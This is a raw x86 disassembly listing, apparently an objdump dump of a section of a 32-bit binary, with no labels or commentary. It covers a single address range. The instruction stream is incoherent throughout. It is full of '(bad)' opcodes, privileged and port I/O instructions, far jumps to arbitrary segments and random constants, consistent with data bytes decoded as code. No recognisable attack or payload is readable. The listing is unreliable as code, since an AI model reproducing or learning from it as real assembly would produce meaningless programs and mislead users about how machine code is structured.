  417a94:	cmp    DWORD PTR [edi],ecx
  417a96:	stos   BYTE PTR es:[edi],al
  417a97:	mov    eax,DWORD PTR [ebp+0x416707b7]
  417a9d:	adc    al,cl
  417a9f:	jp     0x417a4a
  417aa1:	and    BYTE PTR ss:[ebp-0x52],0x7f
  417aa6:	bts    WORD PTR [edi],si
  417aaa:	ins    BYTE PTR es:[edi],dx
  417aab:	(bad)
  417aaf:	cmp    eax,0xfdba5a7f
  417ab4:	and    DWORD PTR [ebp-0x30],ebx
  417ab7:	scas   al,BYTE PTR es:[edi]
  417ab8:	fdivrp st(1),st
  417aba:	inc    edx
  417abb:	pusha  
  417abc:	and    DWORD PTR [esi],0x6f
  417abf:	xlat   BYTE PTR ds:[ebx]
  417ac0:	pop    es
  417ac1:	inc    esi
  417ac2:	cmp    al,BYTE PTR [ebx+0x5f]
  417ac5:	xchg   esi,eax
  417ac6:	ds mov bl,0xd
  417ac9:	fistp  WORD PTR [ecx-0xf]
  417acc:	aam    0x7e
  417ace:	daa    
  417acf:	mov    BYTE PTR [ecx],dh
  417ad1:	test   al,0x97
  417ad3:	xor    bh,BYTE PTR [esi]
  417ad5:	int    0x4b
  417ad7:	retf   0x634c
  417ada:	rcr    BYTE PTR [edi],0xec
  417add:	cld    
  417ade:	imul   edi,DWORD PTR [edi+0x435f767d],0x6d
  417ae5:	dec    ecx
  417ae6:	mov    esi,0xe887d073
  417aeb:	xor    ebp,0xffffffbe
  417aee:	jg     0x417b0b
  417af0:	sub    eax,0x949baad
  417af5:	sbb    eax,0x2dc465a1
  417afa:	icebp  
  417afb:	popf   
  417afc:	fnstcw WORD PTR ds:0x7fea9a5c
  417b02:	fsub   st(7),st
  417b04:	jmp    0x8b67:0xb4e9c35e
  417b0b:	xchg   ebx,eax
  417b0c:	xchg   esi,eax
  417b0d:	jp     0x417afc
  417b0f:	cli    
  417b10:	mov    es,ecx
  417b12:	fimul  DWORD PTR [ecx-0x535ec735]
  417b18:	sbb    bh,BYTE PTR [edi-0x11]
  417b1b:	xchg   ebp,eax
  417b1c:	adc    eax,0x893bfa29
  417b21:	or     cl,BYTE PTR [ebp+0x7fe12c5f]
  417b27:	das    
  417b28:	sbb    BYTE PTR [ecx-0x3a1daade],ah
  417b2e:	and    ebp,DWORD PTR [ebx+0x66]
  417b31:	retf   
  417b32:	inc    edx
  417b33:	mov    al,0x11
  417b35:	lea    edi,[ecx-0x58c79b24]
  417b3b:	iret   
  417b3c:	add    ah,BYTE PTR [ecx]
  417b3e:	jmp    0x85c04280
  417b43:	pop    ecx
  417b44:	sbb    al,BYTE PTR [ebx-0x2b618115]
  417b4a:	jbe    0x417ad7
  417b4c:	sbb    ebx,ecx
  417b4e:	lods   eax,DWORD PTR ds:[esi]
  417b4f:	mov    ah,BYTE PTR [eax]
  417b51:	adc    al,BYTE PTR [edi]
  417b53:	pop    ebx
  417b54:	sub    eax,esp
  417b56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b57:	outs   dx,BYTE PTR ds:[esi]
  417b58:	push   ecx
  417b59:	fidiv  WORD PTR [ebx]
  417b5b:	fadd   QWORD PTR [ebx]
  417b5d:	les    ebp,FWORD PTR [ecx+0x30]
  417b60:	pop    ebx
  417b61:	push   es
  417b62:	and    DWORD PTR [eax-0x5b],ecx
  417b65:	dec    edx
  417b66:	xor    al,0xb0
  417b68:	and    ah,BYTE PTR ds:0xbd0a42f7
  417b6e:	jnp    0x417b81
  417b70:	inc    ecx
  417b71:	and    esi,edi
  417b73:	jle    0x417b47
  417b75:	(bad)  
  417b76:	or     eax,0x9da6cb6b
  417b7b:	xor    DWORD PTR [ebx+0x43],0xffffffae
  417b7f:	aad    0xd
  417b81:	sahf   
  417b82:	repnz mov al,0xfa
  417b85:	out    dx,eax
  417b86:	xchg   edi,eax
  417b87:	and    dh,bh
  417b89:	stos   DWORD PTR es:[edi],eax
  417b8a:	repz test bl,ah
  417b8d:	fnsave [eax-0x44]
  417b90:	mov    ch,0x3e
  417b92:	sbb    DWORD PTR [ecx-0x55],edi
  417b95:	aaa    
  417b96:	into   
  417b97:	fld    TBYTE PTR [esi-0x34a21f87]
  417b9d:	iret   
  417b9e:	dec    ebp
  417b9f:	(bad)  
  417ba0:	jle    0x417bc7
  417ba2:	leave  
  417ba3:	addr16 inc esi
  417ba5:	cmp    DWORD PTR [eax-0x24],eax
  417ba8:	xor    ch,ah
  417baa:	clc    
  417bab:	fmul   QWORD PTR [esi+0x24768ec9]
  417bb1:	adc    ebp,DWORD PTR [ecx+0x40516935]
  417bb7:	(bad)  
  417bb8:	iret   
  417bb9:	loopne 0x417bfe
  417bbb:	pop    ebx
  417bbc:	jl     0x417c2e
  417bbe:	pop    ebp
  417bbf:	sahf   
  417bc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bc1:	sar    DWORD PTR [eax+0xd],1
  417bc4:	mov    ebx,0x8efd7fbe
  417bc9:	push   ss
  417bca:	mov    edi,0x20bd7ddc
  417bcf:	xlat   BYTE PTR ds:[ebx]
  417bd0:	inc    ebx
  417bd1:	fbld   TBYTE PTR [ebx]
  417bd3:	loope  0x417b64
  417bd5:	shr    BYTE PTR [edx],cl
  417bd7:	sbb    eax,0x81a39c13
  417bdc:	mov    ch,0x78
  417bdf:	dec    edi
  417be0:	and    DWORD PTR [edx-0x28],edi
  417be3:	(bad)  
  417be4:	loopne 0x417c1c
  417be6:	sbb    eax,0xf0deec96
  417beb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bec:	xchg   edi,eax
  417bed:	jne    0x417b9e
  417bef:	jp     0x417c19
  417bf1:	add    al,0x14
  417bf3:	cs clc 
  417bf5:	xchg   esp,eax
  417bf6:	pop    ecx
  417bf7:	push   ds
  417bf8:	dec    ebp
  417bf9:	test   eax,0x9d6d55a2
  417bfe:	pop    esp
  417bff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c00:	in     eax,0x0
  417c02:	xor    al,0xcd
  417c04:	div    DWORD PTR [esi+0x3ad48b95]
  417c0a:	cmp    ah,BYTE PTR [eax-0x1ed9ef0a]
  417c10:	push   ecx
  417c11:	xor    eax,0x67b7f04f
  417c16:	sub    cl,BYTE PTR [edi+0x31]
  417c19:	jecxz  0x417c22
  417c1b:	rol    DWORD PTR [ebp-0x5c],1
  417c1e:	clc    
  417c1f:	(bad)  
  417c21:	in     al,dx
  417c22:	test   eax,0x9c602f67
  417c27:	mov    eax,0x83024090
  417c2c:	aad    0xfc
  417c2e:	idiv   BYTE PTR [ebx]
  417c30:	or     bl,dl
  417c32:	and    BYTE PTR [ecx],bh
  417c34:	jp     0x417bb8
  417c36:	test   DWORD PTR es:[eax+0x239d1355],eax
  417c3d:	cmp    BYTE PTR [edx],dh
  417c3f:	imul   ebp,DWORD PTR [eax],0x22499d83
  417c45:	stos   DWORD PTR es:[edi],eax
  417c46:	cmp    BYTE PTR [eax],bh
  417c48:	cmp    eax,0x889ae1f2
  417c4d:	(bad)  
  417c4f:	mov    ch,0x23
  417c51:	pop    edx
  417c52:	in     al,0x9b
  417c54:	adc    cl,bh
  417c56:	mov    DWORD PTR [ebx-0x49],edx
  417c59:	and    dl,BYTE PTR [edx+esi*1+0x12ae0330]
  417c60:	or     BYTE PTR [edi+0x69fdfdd2],bl
  417c66:	iret   
  417c67:	or     eax,0xe09a2b9b
  417c6c:	push   edx
  417c6d:	fld    QWORD PTR [eax+0x3ad99d35]
  417c73:	arpl   WORD PTR [edi+esi*8+0x0],si
  417c77:	(bad)  
  417c78:	fsubr  QWORD PTR [ebx-0x2d819504]
  417c7e:	popa   
  417c7f:	inc    edx
  417c80:	pop    ebx
  417c81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c82:	dec    edx
  417c83:	fld    DWORD PTR [eax]
  417c85:	push   ecx
  417c86:	xor    dh,BYTE PTR [ecx+0x1a]
  417c89:	shl    DWORD PTR [ecx-0x3],0x6e
  417c8d:	in     eax,0x85
  417c8f:	mov    edx,DWORD PTR [ecx+0x49]
  417c92:	mov    ebp,0xd2508880
  417c97:	outs   dx,BYTE PTR ds:[esi]
  417c98:	shl    DWORD PTR [edx+0x51904a24],1
  417c9e:	or     eax,0x98a1d4ad
  417ca3:	xor    eax,0xa2a40d1b
  417ca8:	shl    DWORD PTR [eax+0x61c37430],cl
  417cae:	hlt    
  417caf:	jns    0x417d1c
  417cb1:	push   0x4c0c9892
  417cb6:	cmp    BYTE PTR [ecx-0x48],0xb3
  417cba:	scas   eax,DWORD PTR es:[edi]
  417cbb:	push   0xda83dba6
  417cc0:	mov    BYTE PTR [edx-0x3],bh
  417cc3:	xchg   esi,eax
  417cc4:	mov    bl,0x88
  417cc6:	sub    eax,0xd398e4ec
  417ccb:	adc    BYTE PTR [ecx-0x122afa6a],ah
  417cd1:	pop    esp
  417cd2:	mov    ecx,0xb30118c5
  417cd7:	fcmovnbe st,st(6)
  417cd9:	fcom   DWORD PTR [eax]
  417cdb:	cwde   
  417cdc:	shl    edi,cl
  417cde:	ja     0x417ca6
  417ce0:	repz ficomp WORD PTR [esi]
  417ce3:	push   edi
  417ce4:	mov    ds:0x1a774bfa,al
  417ce9:	inc    ecx
  417cea:	ror    al,0xf9
  417ced:	jns    0x417d52
  417cef:	xchg   edx,eax
  417cf0:	xchg   ebp,eax
  417cf1:	jb     0x417cd8
  417cf3:	sub    DWORD PTR [ebx+0x6c],0xffffff90
  417cf7:	mov    eax,0xdf9cb1a8
  417cfc:	sti    
  417cfd:	dec    ebp
  417cfe:	adc    BYTE PTR [ebx+0x20],0xbb
  417d02:	mov    al,ds:0x4ad1a99b
  417d07:	add    DWORD PTR [ecx-0x43114d47],0xcf8558c9
  417d11:	pushf  
  417d12:	shl    DWORD PTR [eax-0x1f],1
  417d15:	cmp    BYTE PTR [edi-0xb52c44b],bl
  417d1b:	lods   al,BYTE PTR ds:[esi]
  417d1c:	shl    DWORD PTR [ebp+0x17df2886],cl
  417d22:	mul    BYTE PTR [edx]
  417d24:	lock and BYTE PTR [eax+ebx*4],cl
  417d28:	pop    ebx
  417d29:	sbb    BYTE PTR [esi+ebx*8-0x3a853917],al
  417d30:	jmp    0xc1a56c64
  417d35:	xor    edx,edi
  417d37:	pop    ebp
  417d38:	test   al,0x26
  417d3a:	mov    al,ds:0x47456e8e
  417d3f:	ins    DWORD PTR es:[edi],dx
  417d40:	ficomp WORD PTR [ebp-0x6c4ffb4]
  417d46:	inc    edi
  417d47:	test   BYTE PTR [ebx+0x5b],bh
  417d4a:	(bad)  
  417d4b:	sbb    ebx,ebx
  417d4d:	bnd jnp 0x417ce1
  417d50:	mov    ds:0x90c424d4,eax
  417d55:	mov    cl,0xf3
  417d57:	cmp    BYTE PTR [edi+eiz*8+0x2b],0x78
  417d5c:	stc    
  417d5d:	loope  0x417dcc
  417d5f:	ja     0x417cfe
  417d61:	mov    ch,0xa2
  417d63:	cs push esp
  417d65:	cmp    eax,0x493ac781
  417d6a:	dec    ebp
  417d6b:	push   DWORD PTR [edx]
  417d6d:	rcl    BYTE PTR [esi],1
  417d6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d70:	daa    
  417d71:	retf   0xc8ec
  417d74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d75:	mov    dh,0x8c
  417d77:	or     ebx,DWORD PTR [esi+ecx*1-0x73]
  417d7b:	out    dx,eax
  417d7c:	test   DWORD PTR cs:[ecx+0x40],ebp
  417d80:	popf   
  417d81:	xchg   edx,eax
  417d82:	xor    al,0x8d
  417d84:	cmp    DWORD PTR [eax],eax
  417d86:	sbb    eax,esi
  417d88:	mov    bl,0x8d
  417d8a:	mov    al,BYTE PTR [esi-0x7b]
  417d8d:	mov    ah,0x1a
  417d8f:	sahf   
  417d90:	(bad)  
  417d91:	sti    
  417d92:	adc    BYTE PTR [ebp-0x7854e153],0x61
  417d99:	sbb    ebp,ebx
  417d9b:	pop    esp
  417d9c:	retf   
  417d9d:	xchg   esp,eax
  417d9e:	push   edi
  417d9f:	int3   
  417da0:	das    
  417da1:	or     esp,ebx
  417da3:	adc    edx,esp
  417da5:	fdivrp st(1),st
  417da7:	out    0x4f,eax
  417da9:	pop    ecx
  417daa:	dec    esp
  417dab:	jmp    0x9c7b:0x80e13416
  417db2:	jnp    0x417d4d
  417db4:	pop    edx
  417db5:	xor    esp,edi
  417db7:	fild   DWORD PTR [edi]
  417db9:	adc    DWORD PTR [ebx+0x4b],edx
  417dbc:	push   edi
  417dbd:	dec    esi
  417dbe:	ja     0x417d62
  417dc0:	push   ss
  417dc1:	adc    BYTE PTR [eax-0x66],al
  417dc4:	(bad)  
  417dc5:	adc    cl,BYTE PTR [ebp+0x5fe0510e]
  417dcb:	aad    0x3a
  417dcd:	or     BYTE PTR [eax+0x726c4e19],bl
  417dd3:	push   cs
  417dd4:	lods   al,BYTE PTR ds:[esi]
  417dd5:	jmp    0x417dc7
  417dd7:	mov    ch,0x10
  417dd9:	xchg   esi,eax
  417dda:	jo     0x417e49
  417ddc:	cmp    bh,BYTE PTR [esi+eiz*1]
  417ddf:	daa    
  417de0:	mov    ah,0xa4
  417de2:	pop    eax
  417de3:	xchg   esp,eax
  417de4:	add    BYTE PTR [ebp+eax*4+0x57],ch
  417de8:	jae    0x417d93
  417dea:	or     DWORD PTR [edx],esi
  417dec:	repnz cli 
  417dee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417def:	lahf   
  417df0:	data16 mov dl,0xc0
  417df3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417df4:	mov    al,ds:0xd7e8120
  417df9:	xchg   eax,esp
  417dfb:	pushf  
  417dfc:	cs loope 0x417e08
  417dff:	(bad)  
  417e01:	sbb    DWORD PTR [eax+esi*8],edi
  417e04:	lods   eax,DWORD PTR ds:[esi]
  417e05:	retf   
  417e06:	nop
  417e07:	add    DWORD PTR [esi],eax
  417e09:	(bad)  [ecx+0x102d2fb2]
  417e0f:	bound  eax,QWORD PTR [ecx+0x12]
  417e12:	arpl   WORD PTR [eax],si
  417e14:	mov    ebp,0x2d4056e8
  417e19:	dec    edi
  417e1a:	xchg   esp,eax
  417e1b:	or     eax,0x7b40f5fd
  417e20:	pop    ecx
  417e21:	loope  0x417e49
  417e23:	sub    BYTE PTR [esi+0x7d],ch
  417e26:	int3   
  417e27:	pop    ecx
  417e28:	and    BYTE PTR [bp+di],cl
  417e2b:	adc    BYTE PTR [ecx+0x1],al
  417e2e:	je     0x417df9
  417e30:	xlat   BYTE PTR ds:[ebx]
  417e31:	sub    eax,esi
  417e33:	push   ss
  417e34:	pop    ebx
  417e35:	jle    0x417eb4
  417e37:	mov    dl,0xb2
  417e39:	(bad)
  417e3c:	add    bl,cl
  417e3e:	xor    al,0xa2
  417e40:	xlat   BYTE PTR ds:[ebx]
  417e41:	lods   eax,DWORD PTR ds:[esi]
  417e42:	push   0x5d
  417e44:	fs daa 
  417e46:	xor    edx,DWORD PTR [ecx+0x194a40f3]
  417e4c:	push   ebx
  417e4d:	push   0xd14c19ea
  417e52:	mov    dl,0xc7
  417e54:	sub    eax,0xa16d3f90
  417e59:	push   esi
  417e5a:	ss enter 0xec97,0x3b
  417e5f:	push   0x64
  417e61:	and    al,0xa6
  417e63:	out    0xf9,al
  417e65:	outs   dx,BYTE PTR ds:[si]
  417e67:	push   esp
  417e68:	push   ds
  417e69:	lods   eax,DWORD PTR ds:[esi]
  417e6a:	adc    DWORD PTR [ebx],edx
  417e6c:	out    dx,eax
  417e6d:	(bad)  
  417e6e:	pushf  
  417e6f:	mov    eax,0xca0a2c47
  417e74:	cwde   
  417e75:	adc    al,0x97
  417e77:	les    ebp,FWORD PTR [esi+ecx*8+0x651886aa]
  417e7e:	js     0x417e24
  417e80:	push   es
  417e81:	and    ecx,esi
  417e83:	inc    ebx
  417e84:	jno    0x417e76
  417e86:	imul   esp,DWORD PTR [esi+0x39],0xfffffff1
  417e8a:	jl     0x417ec3
  417e8c:	leave  
  417e8d:	int    0x59
  417e8f:	loope  0x417e59
  417e91:	lods   al,BYTE PTR ds:[esi]
  417e92:	imul   edi,DWORD PTR [ecx-0x5a2c29f0],0xd3b05e03
  417e9c:	stos   BYTE PTR es:[edi],al
  417e9d:	sahf   
  417e9e:	mov    esp,0x9ed5cdea
  417ea3:	xchg   ebx,eax
  417ea4:	fimul  DWORD PTR [eax+ecx*2]
  417ea7:	or     ah,ah
  417ea9:	rcl    eax,1
  417eab:	mov    ch,0x34
  417ead:	push   ebx
  417eae:	(bad)
  417eb2:	int3   
  417eb3:	or     ah,BYTE PTR [edx-0x54]
  417eb6:	rcr    BYTE PTR [ecx],cl
  417eb8:	in     al,dx
  417eb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417eba:	lods   al,BYTE PTR ds:[esi]
  417ebb:	jl     0x417f33
  417ebd:	dec    ebx
  417ebe:	mov    bl,0xa0
  417ec1:	sbb    al,0x6e
  417ec3:	sub    esi,0xffffffdc
  417ec6:	loop   0x417f1f
  417ec8:	dec    edi
  417ec9:	stos   DWORD PTR es:[edi],eax
  417eca:	inc    edi
  417ecb:	pop    ds
  417ecc:	hlt    
  417ecd:	inc    edx
  417ece:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ecf:	cmp    DWORD PTR [ebx+0x33],eax
  417ed2:	and    eax,0x1ca56e84
  417ed7:	and    cl,bh
  417ed9:	sbb    eax,DWORD PTR [eax+0x5e]
  417edc:	ins    BYTE PTR es:[edi],dx
  417edd:	shl    bx,1
  417ee0:	fild   DWORD PTR [eax+0x62]
  417ee3:	je     0x417ec2
  417ee5:	daa    
  417ee6:	jo     0x417ed3
  417ee8:	mov    bh,0x2d
  417eea:	test   BYTE PTR [ecx+ebx*2-0x75],bl
  417eee:	es xchg ebp,eax
  417ef0:	push   ecx
  417ef1:	mov    BYTE PTR ds:0xa37ded3e,dl
  417ef7:	push   ds
  417ef8:	pop    esi
  417ef9:	jb     0x417f28
  417efb:	pop    ds
  417efc:	aas    
  417efd:	cwde   
  417efe:	pop    esi
  417eff:	jbe    0x417ea2
  417f01:	es cwde 
  417f03:	jl     0x417f65
  417f05:	cmp    ebx,ebx
  417f07:	dec    ebx
  417f08:	push   0xf83c374d
  417f0d:	imul   DWORD PTR [ebx]
  417f0f:	pop    ebp
  417f10:	imul   ebp,DWORD PTR [ecx+0x0],0x22
  417f14:	bnd js 0x417ed0
  417f17:	adc    bl,cl
  417f19:	mov    ebp,0x4810706c
  417f1e:	mov    WORD PTR [edi+ecx*1+0xb],fs
  417f22:	sub    esi,esi
  417f24:	out    dx,al
  417f25:	loope  0x417f46
  417f27:	sar    ch,cl
  417f29:	inc    eax
  417f2a:	dec    eax
  417f2b:	hlt    
  417f2c:	call   0x3c4d:0xbad914f9
  417f33:	int    0x83
  417f35:	sti    
  417f36:	or     cl,bl
  417f38:	pop    edi
  417f39:	pop    edi
  417f3a:	cmp    edi,DWORD PTR [ecx-0x3e10b757]
  417f40:	pop    edx
  417f42:	stc    
  417f43:	push   0xffffff8c
  417f45:	ja     0x417f06
  417f47:	jae    0x417f53
  417f49:	push   ss
  417f4a:	test   eax,0x564e7fbf
  417f4f:	(bad)  
  417f50:	jmp    0x417f8b
  417f52:	push   esi
  417f53:	in     al,dx
  417f54:	outs   dx,BYTE PTR ds:[esi]
  417f55:	or     al,BYTE PTR [esp+ebx*1-0x2a]
  417f59:	mov    edi,0x1d6f223f
  417f5e:	mov    BYTE PTR [ecx-0x2c],bl
  417f61:	outs   dx,DWORD PTR ds:[esi]
  417f62:	dec    eax
  417f63:	push   ebx
  417f64:	inc    edx
  417f65:	lds    ebp,FWORD PTR [esi+ecx*8+0x7bb57061]
  417f6c:	mov    al,ds:0x7c80ad53
  417f71:	je     0x417f30
  417f73:	and    eax,0xdf1e6b43
  417f78:	loop   0x417fed
  417f7a:	xrelease xchg DWORD PTR [eax-0x2a5b0649],esp
  417f81:	inc    edx
  417f82:	mov    ebx,0x4a0019fb
  417f87:	in     al,dx
  417f88:	pop    ss
  417f89:	sub    al,0xbd
  417f8b:	les    esi,FWORD PTR [ebx+0x58992f63]
  417f91:	xor    al,0x72
  417f93:	mov    DWORD PTR [ebx-0x66],ecx
  417f96:	cmp    ecx,DWORD PTR [ebp-0x7c]
  417f99:	mov    esp,0xfafb2941
  417f9e:	or     esp,ebp
  417fa0:	jl     0x41801a
  417fa2:	jno    0x41800a
  417fa4:	test   DWORD PTR [ebx],0x490afe01
  417faa:	mov    esi,edi
  417fac:	test   al,0x29
  417faf:	adc    al,0xb
  417fb1:	cld    
  417fb2:	popa   
  417fb3:	push   esp
  417fb4:	xor    DWORD PTR [edi+edi*4-0x28093573],0x6f
  417fbc:	cmp    WORD PTR [ebx-0x2a],cx
  417fc0:	hlt    
  417fc1:	sbb    bh,dl
  417fc3:	(bad)  
  417fc4:	(bad)  [ecx+0x7ed4de1c]
  417fca:	xlat   BYTE PTR ds:[ebx]
  417fcb:	ret    0x87a6
  417fce:	sbb    ecx,DWORD PTR [esi]
  417fd0:	outs   dx,DWORD PTR ds:[esi]
  417fd1:	inc    ebx
  417fd2:	sti    
  417fd3:	imul   ebp,DWORD PTR [esi+0x3d13039a],0x633959f
  417fdd:	popf   
  417fde:	enter  0x3a60,0x4a
  417fe2:	shr    DWORD PTR [eax-0x54],0x9a
  417fe6:	js     0x417f7e
  417fe8:	jg     0x417f8d
  417fea:	sub    eax,0xb0e89606
  417fef:	xor    DWORD PTR [edi],esp
  417ff1:	dec    edi
  417ff2:	cmp    esp,DWORD PTR [edx+0x71]
  417ff5:	or     eax,0xc86fc5d2
  417ffa:	jmp    0x5431a30b
  417fff:	test   eax,0x3bb8fd5
  418004:	out    0x37,eax
  418006:	out    dx,eax
  418007:	mov    ds:0x55a00e38,eax
  41800c:	test   DWORD PTR [ebx-0x57],edx
  41800f:	jecxz  0x417fd5
  418011:	mov    al,0xf9
  418013:	push   edi
  418014:	dec    esp
  418015:	outs   dx,DWORD PTR ds:[esi]
  418016:	je     0x417ff5
  418018:	xchg   ebp,eax
  418019:	aas    
  41801a:	cld    
  41801b:	rcr    DWORD PTR [edx-0x49c93e25],0x18
  418022:	int    0x43
  418024:	sub    eax,0x7599c9d7
  418029:	enter  0xb15b,0xc7
  41802d:	jg     0x41802d
  41802f:	sub    BYTE PTR ds:0x9ffd5526,ah
  418035:	aaa    
  418036:	pop    ecx
  418037:	inc    edx
  418038:	jp     0x418082
  41803a:	sti    
  41803b:	xchg   BYTE PTR [esi+0x8],ch
  41803e:	sahf   
  41803f:	add    bh,BYTE PTR [ebp-0x55]
  418042:	pop    ecx
  418043:	aas    
  418044:	dec    edi
  418045:	mov    edx,0xa6445972
  41804a:	and    bl,BYTE PTR [esi]
  41804c:	mov    ebx,DWORD PTR [ecx+0x8]
  41804f:	and    al,0x18
  418051:	jns    0x4180a3
  418053:	loope  0x4180c3
  418055:	loopne 0x41801c
  418057:	fiadd  WORD PTR [edi]
  418059:	mov    edi,0x5a49af15
  41805e:	mov    edi,0xa12b810d
  418063:	ins    DWORD PTR es:[edi],dx
  418064:	ficom  WORD PTR [edx-0x6d989dc8]
  41806a:	fwait
  41806b:	xchg   esp,eax
  41806c:	cs mov ah,0xde
  41806f:	inc    esi
  418070:	sub    bl,bl
  418072:	shl    DWORD PTR [ebp-0x5f],1
  418075:	or     BYTE PTR [edx-0x5a],al
  418078:	pop    ss
  418079:	cmp    al,0x7b
  41807b:	popa   
  41807c:	push   edi
  41807d:	rcr    BYTE PTR [ecx-0x62304919],0x83
  418084:	sub    DWORD PTR [ebp-0x19a00c89],0xb5bdd216
  41808e:	jb     0x41810e
  418090:	jbe    0x418085
  418092:	pop    es
  418093:	and    ch,BYTE PTR [esp+ecx*4+0x48e6b8d0]
  41809a:	fst    st(4)
  41809c:	mov    ebx,0xa1b85ffa
  4180a1:	push   cs
  4180a2:	mov    DWORD PTR [edx],eax
  4180a4:	ret    
  4180a5:	jbe    0x4180e9
  4180a7:	mov    al,ds:0xa0dceb36
  4180ac:	mov    BYTE PTR [ebp+eiz*1+0x5f1e3baa],ch
  4180b3:	nop
  4180b4:	mov    ch,0x8d
  4180b6:	xor    esi,DWORD PTR [eax-0x11]
  4180b9:	mov    al,ds:0xc063bbb5
  4180be:	cmp    BYTE PTR [edi],0xb1
  4180c1:	leave  
  4180c2:	loop   0x418112
  4180c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180c5:	(bad)  
  4180c6:	and    eax,0xdaed9289
  4180cb:	int3   
  4180cc:	mov    edx,0xbb5cd6d2
  4180d1:	mov    BYTE PTR [esi+ecx*1-0x79],al
  4180d5:	dec    eax
  4180d6:	(bad)  
  4180d7:	in     eax,0x6
  4180d9:	jbe    0x418074
  4180db:	or     al,0x4f
  4180dd:	out    0x97,al
  4180df:	sub    eax,0x503c20c0
  4180e4:	add    esi,DWORD PTR [eax]
  4180e6:	dec    ecx
  4180e7:	inc    edx
  4180e8:	popa   
  4180e9:	sahf   
  4180ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180ec:	pusha  
  4180ed:	fdivr  QWORD PTR [esi+0x75f9514f]
  4180f3:	mov    BYTE PTR [edx],0x6f
  4180f6:	and    DWORD PTR [esi],edx
  4180f8:	dec    esp
  4180f9:	outs   dx,DWORD PTR ds:[esi]
  4180fa:	and    DWORD PTR [ecx-0x1a],esi
  4180fd:	nop
  4180fe:	clc    
  4180ff:	adc    eax,0x1a7bfe1d
  418104:	add    al,0xfd
  418106:	mov    edi,0x273d455b
  41810b:	and    BYTE PTR ds:0x23729771,al
  418111:	call   0xc304:0x63613472
  418118:	jg     0x4180fa
  41811a:	add    BYTE PTR [esi+0x26012a1],0x43
  418121:	mov    ecx,0x2b53bac6
  418126:	fcom   DWORD PTR [edi+ebx*1-0x42]
  41812a:	add    al,0xeb
  41812c:	rcl    DWORD PTR [esi+0x2523cc6],cl
  418132:	or     edi,DWORD PTR [ebp+0x313fe1a5]
  418138:	int    0x28
  41813a:	push   ds
  41813b:	jnp    0x4180fe
  41813d:	push   eax
  41813e:	push   edi
  41813f:	sub    BYTE PTR [ebx-0x43daab40],al
  418145:	sbb    DWORD PTR ds:0x1db8a618,edi
  41814b:	mov    dh,0x71
  41814d:	jno    0x4180e2
  41814f:	dec    esp
  418150:	mov    dl,0xfc
  418152:	and    al,BYTE PTR [eax+ebp*8]
  418155:	xchg   esp,eax
  418156:	(bad)  
  418157:	add    eax,0x24e7ba82
  41815c:	dec    esi
  41815d:	mov    edi,eax
  41815f:	add    DWORD PTR [edx],esi
  418161:	cmc    
  418162:	int3   
  418163:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418164:	(bad)  [eax]
  418166:	call   0xcf4f:0x1ff657a7
  41816d:	mov    ebp,0x3dafdba9
  418172:	mov    ah,0xf
  418174:	sahf   
  418175:	dec    ebx
  418176:	push   DWORD PTR [edi-0x7f]
  418179:	xlat   BYTE PTR ds:[ebx]
  41817a:	jg     0x41819f
  41817c:	sub    DWORD PTR [edi+edx*4],ebp
  41817f:	lock addr16 add eax,0x291be997
  418186:	or     edi,DWORD PTR [ebx-0x3d0794e9]
  41818c:	mov    cl,0xe3
  41818e:	mov    bh,0x36
  418190:	(bad)  
  418191:	test   BYTE PTR [eax],0x49
  418194:	inc    ebx
  418195:	jne    0x41816f
  418197:	sub    eax,0x2e26aaac
  41819c:	inc    ebp
  41819d:	addr16 arpl bp,cx
  4181a0:	syscall 
  4181a2:	xor    DWORD PTR [ecx-0x3b],ecx
  4181a5:	je     0x418187
  4181a7:	push   ebx
  4181a8:	enter  0x2741,0xf9
  4181ac:	mov    ebx,DWORD PTR [ecx-0x25]
  4181af:	or     esi,ebx
  4181b1:	mov    esp,0xb2af2760
  4181b6:	lea    ecx,[edx-0x38f49571]
  4181bc:	daa    
  4181bd:	xchg   eax,eax
  4181bf:	mov    ebp,0xd08096bf
  4181c4:	in     eax,dx
  4181c5:	push   ecx
  4181c6:	imul   eax,DWORD PTR [eax-0x6f1d0863],0x12
  4181cd:	cld    
  4181ce:	mov    dl,0xf8
  4181d0:	jecxz  0x418208
  4181d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181d3:	xchg   esi,eax
  4181d4:	inc    esi
  4181d5:	mov    al,0xc8
  4181d7:	idiv   BYTE PTR [edi-0x1ca6fd4b]
  4181dd:	push   DWORD PTR [eax]
  4181df:	test   DWORD PTR [ebx],esp
  4181e1:	fcomip st,st(5)
  4181e3:	daa    
  4181e4:	in     eax,dx
  4181e5:	xchg   edx,eax
  4181e6:	test   eax,0xd577cff2
  4181eb:	mov    ch,0xe9
  4181ed:	cwde   
  4181ee:	pop    edx
  4181ef:	push   es
  4181f0:	sbb    BYTE PTR [edi-0x59],0x35
  4181f4:	pop    ebx
  4181f5:	cmp    BYTE PTR [esi],0xb
  4181f8:	out    0xa0,eax
  4181fa:	das    
  4181fb:	adc    al,0x9f
  4181fd:	mov    ds:0xbac0a07c,al
  418202:	test   al,0xe4
  418204:	mov    esi,0xdbbb4e40
  418209:	std    
  41820a:	sbb    esp,DWORD PTR [eax-0x7695c3d8]
  418210:	(bad)  
  418211:	popf   
  418212:	mov    ah,0x2f
  418214:	mov    ebx,es
  418216:	gs hlt 
  418218:	inc    dl
  41821a:	xchg   BYTE PTR [edi-0x14],bh
  41821d:	add    al,ah
  41821f:	stc    
  418220:	pushf  
  418221:	add    DWORD PTR [edi-0x79],ebx
  418224:	xor    al,0xa
  418226:	dec    edx
  418227:	mov    ds:0xc45fd84,eax
